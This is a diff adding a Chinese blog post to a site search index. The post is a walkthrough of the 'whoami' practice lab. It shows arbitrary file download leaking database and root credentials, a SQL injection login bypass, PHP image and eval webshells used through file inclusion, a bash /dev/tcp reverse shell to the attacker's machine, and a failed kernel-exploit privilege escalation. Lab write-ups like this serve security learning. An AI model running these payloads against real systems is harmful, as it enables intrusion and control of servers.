@@ -303,4 +303,162 @@ if($data &#x3D;&#x3D; &#39;&#39;)&#123;undefined
         <tag>逻辑漏洞</tag>
       </tags>
   </entry>
+  <entry>
+    <title>whoami靶场渗透测试</title>
+    <url>/2022/04/26/whoami%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting@1/dist/Meting.min.js"></script><h1 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h1><p>靶机：云演考试题，whoami靶机（源码没有找到没有在本地搭）</p>
+<p>攻击机：kali</p>
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>开始时访问网站发现啥信息也没有</p>
+<p><img src="/2022/04/26/whoami%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220426202955993.png" alt="image-20220426202955993" loading="lazy"></p>
+<h2 id="获取靶机ip"><a href="#获取靶机ip" class="headerlink" title="获取靶机ip"></a>获取靶机ip</h2><p>windows 终端 ping 即可</p>
+<p><img src="/2022/04/26/whoami%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220426202134496.png" alt="image-20220426202134496" loading="lazy"></p>
+<h2 id="扫描端口"><a href="#扫描端口" class="headerlink" title="扫描端口"></a>扫描端口</h2><p>kali 机使用 <code>nmap -sS + ip</code> 扫描得到靶机开放端口</p>
+<p><img src="/2022/04/26/whoami%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220426202320000.png" alt="image-20220426202320000" loading="lazy"></p>
+<h2 id="扫描目录"><a href="#扫描目录" class="headerlink" title="扫描目录"></a>扫描目录</h2><p>一开始用御剑扫，字典太小了导致啥也没扫到，robots.txt 里面的 flag 提交上去还是错的</p>
+<p><img src="/2022/04/26/whoami%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220426202540195.png" alt="image-20220426202540195" loading="lazy"></p>
+<p>后来用 kali 的 <code>dirb + url</code> 扫描，扫到了有一个 <code>www</code> 目录，然后呢用 <code>dirb + url</code>扫这个目录又扫不出东西了</p>
+<p><img src="/2022/04/26/whoami%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220426202710842.png" alt="image-20220426202710842" loading="lazy"></p>
+<p>说是这么说，还是扫到东西了的，最关键的当属<code>phpmy</code>目录，<code>images</code>和<code>upload_images</code>咱都没权限访问</p>
+<p><img src="/2022/04/26/whoami%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220426205430506.png" alt="image-20220426205430506" loading="lazy"></p>
+<p>于是又转到御剑，发现文件都藏在这目录下了</p>
+<p><img src="/2022/04/26/whoami%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220426203227826.png" alt="image-20220426203227826" loading="lazy"></p>
+<h1 id="开始渗透"><a href="#开始渗透" class="headerlink" title="开始渗透"></a>开始渗透</h1><p>首先访问 <code>www</code></p>
+<p><img src="/2022/04/26/whoami%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220426214127779.png" alt="image-20220426214127779" loading="lazy"></p>
+<p>根据提升尝试进行sql注入攻击，测试语句为万能密码：<code>’ or 1=1 --</code><br>后续还尝试了一些弱口令以及暴力破解，但测试结果都是try again。不知道过滤规则暂时放弃sql注入。</p>
+<p>接着一个个访问此目录下的文件，发现其中 <code>head.php、show.php、c.php</code>分别是照片、空白、空白。而 add.php 是文件上传页面，但是尝试上传图片之后并没有回显地址，暂时作罢。值得注意的是 <code>test.php</code>，乍一看没啥，但是查看网页源代码发现</p>
+<p><img src="/2022/04/26/whoami%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220426203719254.png" alt="image-20220426203719254" loading="lazy"></p>
+<h2 id="文件下载漏洞"><a href="#文件下载漏洞" class="headerlink" title="文件下载漏洞"></a>文件下载漏洞</h2><pre class="line-numbers language-html" data-language="html"><code class="language-html">'file' parameter is empty. Please provide file path in 'file' parameter <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>提示“file”参数为空，请在“file”参数中提供文件路径。这是我们打开新世界大门的关键。</p>
+<p>给test.php页面一个file参数<br>首先考虑是GET方式：<code>http://28e7134f.lxctf.net/www/test.php?file=/etc/passwd</code> ，无果<br>其次考虑POST方式，使用hackbar页面会显示下载该文件。结合burp使用可以直接看到文件的内容：</p>
+<p><img src="/2022/04/26/whoami%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220426204726095.png" alt="image-20220426204726095" loading="lazy"></p>
+<h3 id="获取数据库账号密码"><a href="#获取数据库账号密码" class="headerlink" title="获取数据库账号密码"></a>获取数据库账号密码</h3><p>由上述测试可知，test.php存在文件下载漏洞。我们如法炮制的看看其他文件内容，比如我们通过下载 <code>c.php</code>看到了数据库的账号<code>whoami</code>，密码<code>whoami_hacker</code>，以及数据库名<code>ica_lab</code></p>
+<p><img src="/2022/04/26/whoami%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220426205756732.png" alt="image-20220426205756732" loading="lazy"></p>
+<p>数据库登录后台文件是啥呢？就是前面扫到的phpmy，登陆访问</p>
+<p><img src="/2022/04/26/whoami%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220426210032836.png" alt="image-20220426210032836" loading="lazy"></p>
+<p>看到ica_lab数据库，访问auth看到有一个账号密码。猜测是前面的登陆密码。</p>
+<p><img src="/2022/04/26/whoami%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220426210755198.png" alt="image-20220426210755198" loading="lazy"></p>
+<p>同时发现了flag，但是这个也是错的。</p>
+<p><img src="/2022/04/26/whoami%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220426212140309.png" alt="image-20220426212140309" loading="lazy"></p>
+<h3 id="知晓sql注入绕过方式"><a href="#知晓sql注入绕过方式" class="headerlink" title="知晓sql注入绕过方式"></a>知晓sql注入绕过方式</h3><p>同样利用前面的文件下载漏洞，下载www目录下的index.php文件，它涉及到前端sql注入的绕过方式</p>
+<pre class="line-numbers language-html" data-language="html"><code class="language-html">$uname=str_replace('\'','',urldecode($_POST['un']));
+$pass=str_replace('\'','',urldecode($_POST['ps']));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>这边str_replace的作用是将字符串 \ ‘ 替换为空，因此构造SQL注入登录payload时，必须含有 \ ‘ 字符串，否则会报错。urldecode的作用是将输入解码。我们在之前的payload：’ or 1&#x3D;1– 做出修改，在最后增加 \ ‘，str_replace会将这个\ ‘ 替换为空，所以相当于没加。</p>
+<h3 id="登录前端"><a href="#登录前端" class="headerlink" title="登录前端"></a>登录前端</h3><p>此刻我们就有两种方法登录了</p>
+<p>由于我们在数据库中获取了账号密码，直接登陆即可</p>
+<p><img src="/2022/04/26/whoami%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220426214525298.png" alt="image-20220426214525298" loading="lazy"></p>
+<p>第二种利用上述的sql注入，账号密码均输入<code>&#39; or 1=1 -- /&#39;</code>，也可成功登录（这边我靶机到期重启了一下，域名换了，不过无伤大雅）</p>
+<p><img src="/2022/04/26/whoami%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220426214658674.png" alt="image-20220426214658674" loading="lazy"></p>
+<h2 id="文件上传-包含漏洞getshell"><a href="#文件上传-包含漏洞getshell" class="headerlink" title="文件上传+包含漏洞getshell"></a>文件上传+包含漏洞getshell</h2><p>登陆成功进入 <code>panel.php</code> 页面，首先查看show users模块，发现与数据库中的users模块一致</p>
+<p><img src="/2022/04/26/whoami%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220427110230267.png" alt="image-20220427110230267" loading="lazy"></p>
+<p><img src="/2022/04/26/whoami%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220427110304333.png" alt="image-20220427110304333" loading="lazy"></p>
+<p>再看看add user模块，让我们上传文件，我们跟前面一样利用任意文件下载看看它的后端代码</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'continue'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+	<span class="token variable">$dir</span><span class="token operator">=</span><span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token variable">$choice</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'load'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	
+	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$choice</span><span class="token operator">===</span><span class="token string single-quoted-string">'add'</span><span class="token punctuation">)</span>
+	<span class="token punctuation">&#123;</span>
+       		<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$choice</span><span class="token operator">.</span><span class="token string single-quoted-string">'.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+			<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$choice</span><span class="token operator">===</span><span class="token string single-quoted-string">'show'</span><span class="token punctuation">)</span>
+	<span class="token punctuation">&#123;</span>       
+		<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$choice</span><span class="token operator">.</span><span class="token string single-quoted-string">'.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>
+	<span class="token keyword">else</span>
+	<span class="token punctuation">&#123;</span>
+		<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'load'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>通过代码审计可知此文件存在文件包含漏洞，可以利用文件上传+包含的思路getshell</p>
+<p>其次观察到，只允许我们上传图片类的文件，属于白名单问题，可以利用图片马</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+	<span class="token variable">$name</span><span class="token operator">=</span><span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token variable">$address</span><span class="token operator">=</span><span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'address'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token variable">$id</span><span class="token operator">=</span><span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	
+	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'image'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+	<span class="token punctuation">&#123;</span>
+		<span class="token variable">$iname</span><span class="token operator">=</span><span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'image'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token variable">$r</span><span class="token operator">=</span><span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'image'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token constant">PATHINFO_EXTENSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token variable">$image</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'jpeg'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'jpg'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'gif'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$r</span><span class="token punctuation">,</span><span class="token variable">$image</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+	<span class="token punctuation">&#123;</span>
+		<span class="token variable">$finfo</span> <span class="token operator">=</span> @<span class="token keyword">new</span> <span class="token class-name">finfo</span><span class="token punctuation">(</span><span class="token constant">FILEINFO_MIME</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+	<span class="token variable">$filetype</span> <span class="token operator">=</span> @<span class="token variable">$finfo</span><span class="token operator">-></span><span class="token function">file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'image'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/image\/jpeg/'</span><span class="token punctuation">,</span><span class="token variable">$filetype</span> <span class="token punctuation">)</span>  <span class="token operator">||</span> <span class="token class-name">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/image\/png/'</span><span class="token punctuation">,</span><span class="token variable">$filetype</span> <span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/image\/gif/'</span><span class="token punctuation">,</span><span class="token variable">$filetype</span> <span class="token punctuation">)</span><span class="token punctuation">)</span>
+				<span class="token punctuation">&#123;</span>
+					<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'image'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'uploaded_images/'</span><span class="token operator">.</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'image'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+							 <span class="token punctuation">&#123;</span>
+							  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Uploaded successfully "</span><span class="token punctuation">;</span>
+							  <span class="token variable">$update</span><span class="token operator">=</span><span class="token string single-quoted-string">'insert into users(name,address,image,id) values(\''</span><span class="token operator">.</span><span class="token variable">$name</span><span class="token operator">.</span><span class="token string single-quoted-string">'\',\''</span><span class="token operator">.</span><span class="token variable">$address</span><span class="token operator">.</span><span class="token string single-quoted-string">'\',\''</span><span class="token operator">.</span><span class="token variable">$iname</span><span class="token operator">.</span><span class="token string single-quoted-string">'\', \''</span><span class="token operator">.</span><span class="token variable">$id</span><span class="token operator">.</span><span class="token string single-quoted-string">'\')'</span><span class="token punctuation">;</span> 
+							 <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span> <span class="token variable">$update</span><span class="token punctuation">)</span><span class="token punctuation">;</span>				  
+							<span class="token punctuation">&#125;</span>
+				<span class="token punctuation">&#125;</span>
+			<span class="token keyword">else</span>
+			<span class="token punctuation">&#123;</span>
+				<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>i told you dear, only png,jpg and gif file are allowed"</span><span class="token punctuation">;</span>
+			<span class="token punctuation">&#125;</span>
+	<span class="token punctuation">&#125;</span>
+	<span class="token keyword">else</span>
+	<span class="token punctuation">&#123;</span>
+		<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>only png,jpg and gif file are allowed"</span><span class="token punctuation">;</span>	
+	<span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>随便找一张jpg图片，用010 editor在图片末尾加上</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2022/04/26/whoami%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220427110924330.png" alt="image-20220427110924330" loading="lazy"></p>
+<p>之后上传文件，显示成功，且根据前面得到的目录，不难猜测应该是保存在<code>uploaded_images</code>目录下</p>
+<p>来测试一下文件到底有没有成功包含，使用burp，在URL的post请求中加入<code>POST /panel.php?cmd=cat%20/etc/passwd</code>，正文中加入<code>load=uploaded_images/ma.jpg&amp;continue=continue</code></p>
+<p><img src="/2022/04/26/whoami%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220427111529624.png" alt="image-20220427111529624" loading="lazy"></p>
+<p>可以看到命令已经成功执行。想想怎么用菜刀链接呢？根据前面可知照片是以POST访问的，而菜刀只能以GET访问，所以菜刀是不能连接这个图片马的。</p>
+<p>换个思路，在之前图片马的基础上，写入一句话文件，菜刀连接一句话文件。使用burp执行命令，直接以POST方式写一句到<code>uploaded_images</code>下的<code>webshell.php</code></p>
+<p>要注意的是一句话要通过url编码，<code>echo &#39;&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;&#39; &gt;&gt; uploaded_images/webshell.php</code></p>
+<p><img src="/2022/04/26/whoami%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220427112425022.png" alt="image-20220427112425022" loading="lazy"></p>
+<p>再次访问图片马发现确实写入了</p>
+<p><img src="/2022/04/26/whoami%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220427112737982.png" alt="image-20220427112737982" loading="lazy"></p>
+<p>之后利用菜刀成功连接</p>
+<p><img src="/2022/04/26/whoami%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220427113044235.png" alt="image-20220427113044235" loading="lazy"></p>
+<p><img src="/2022/04/26/whoami%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220427112930621.png" alt="image-20220427112930621" loading="lazy"></p>
+<h2 id="失败的提权"><a href="#失败的提权" class="headerlink" title="失败的提权"></a>失败的提权</h2><p>为什么说是失败的提权，因为我用的这三种方法都没有成功（哭）</p>
+<h3 id="方法一：ssh登录"><a href="#方法一：ssh登录" class="headerlink" title="方法一：ssh登录"></a>方法一：ssh登录</h3><p>由前面的靶机端口可探测到22端口，意味着只需要得到主机的账号密码就可以成功了<br>又联想到PHP默认配置文件是<code>config.inc.php</code>，系统路径结合<code>phpmy</code>（这边我都试了一下，发现在phpmy下）<br>同样利用任意文件下载phpmy&#x2F;config.inc.php，直接查看账户信息</p>
+<p><img src="/2022/04/26/whoami%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220427122134298.png" alt="image-20220427122134298" loading="lazy"></p>
+<p>得到用户名为<code>root</code>，密码为<code>roottoor</code>，尝试连接</p>
+<p><img src="/2022/04/26/whoami%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220427135721856.png" alt="image-20220427135721856" loading="lazy"></p>
+<p>连接失败了，有两个原因：<br>1、远程服务器没有添加公钥（无法认证）<br>2、远程服务器公钥文件夹权限错误（<code>.ssh</code>和<code>.ssh/authorized_keys</code>需要保证只有用户自己有权限，否则验证无效）</p>
+<p>由于这俩都是指向靶机，我在菜刀里也没找到这俩文件，所以放弃这种方法。但至少我们获取了root的账号密码。</p>
+<h3 id="方法二：反弹shell"><a href="#方法二：反弹shell" class="headerlink" title="方法二：反弹shell"></a>方法二：反弹shell</h3><p>kali命令行里输入nc -lvnp 6666开始监听，同时burp的post请求中执行<code>echo “bash -i &gt;&amp; /dev/tcp/192.168.113.130/6666 0&gt;&amp;1” | bash</code>（我kali机的IP地址为192.168.113.130），同样要先经过URL编码才能发送。</p>
+<p><img src="/2022/04/26/whoami%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220427140311116.png" alt="image-20220427140311116" loading="lazy"></p>
+<p>kali监听</p>
+<p><img src="/2022/04/26/whoami%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220427140401082.png" alt="image-20220427140401082" loading="lazy"></p>
+<p>POST发送反弹shell命令</p>
+<p><img src="/2022/04/26/whoami%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220427140456353.png" alt="image-20220427140456353" loading="lazy"></p>
+<p>遗憾的是，kali机并没有反弹会话…</p>
+<p>我真傻，真的，我单单学者如何反弹shell，却没注意它的前提。前提是攻击机在公网ip，但是我的kali机是在内网的，靶机反弹的shell找不到在内网的kali机，所以就监听不到任何东西了…</p>
+<p>由于我也是才接触渗透提权这块，还不是很了解，所以就没有找到很好的解决方法（或许可以找一个公网IP？）。</p>
+<h3 id="方法三：菜刀"><a href="#方法三：菜刀" class="headerlink" title="方法三：菜刀"></a>方法三：菜刀</h3><p>在上述使用菜刀连接后，利用其自带的虚拟终端功能，查看系统内核版本，寻找提权exp。命令为<code>uanme -a</code>和<code>cat /etc/issue</code></p>
+<p><img src="/2022/04/26/whoami%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220427143354789.png" alt="image-20220427143354789" loading="lazy"></p>
+<p>可以在kali机上寻找与版本对应的Ubuntu本地提权漏洞exp</p>
+<p><img src="/2022/04/26/whoami%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220427143651845.png" alt="image-20220427143651845" loading="lazy"></p>
+<p>去<a href="https://link.zhihu.com/?target=https://www.exploit-db.com/exploits/37292/">官网</a>下载exp后将文件导入菜刀</p>
+<p><img src="/2022/04/26/whoami%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220427143902000.png" alt="image-20220427143902000" loading="lazy"></p>
+<p>赋予执行权限 <code>chmod 777 37292.c</code>；编译exp <code>gcc 37292.c -o exp</code>；执行exp，提权至root</p>
+<p><img src="/2022/04/26/whoami%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220427144426329.png" alt="image-20220427144426329" loading="lazy"></p>
+<p>但最后还是失败了…不知道啥原因</p>
+<p>麻了麻了这个提权搞了好久一直不成功，到最后也没有找到一种成功的方法。针对这个靶场的渗透就先做到这里，毕竟是第一次就一个靶场进行完整的渗透，在这个过程中也学到了很多之前或忽略或遗忘的知识，以及很多新的知识。后续会重点关注如何提权，会慢慢学习的XoX</p>
+]]></content>
+      <categories>
+        <category>网络安全</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
+      </tags>
+  </entry>
 </search>
